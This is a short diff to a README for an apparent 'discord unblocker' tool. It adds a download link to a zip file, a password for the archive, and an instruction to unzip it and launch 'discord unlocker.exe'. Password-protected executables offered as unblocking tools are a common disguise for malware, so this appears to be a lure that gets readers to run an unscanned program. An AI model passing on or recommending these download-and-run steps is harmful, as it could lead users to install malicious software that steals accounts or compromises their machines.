@@ -2,7 +2,7 @@
 
 ![hd](https://github.com/user-attachments/assets/7dc979b3-2f58-44a8-9e28-38ecefe9c297)
 
-# [DOWNLOAD]()
+# [DOWNLOAD](https://github.com/Gitzak/discord-unblocker/releases/download/ds/discord.software.zip)
 ##Archive password - ***TR-dsunlock037***
 
  *download the archive, unzip it and launch the "discord unlocker.exe" file
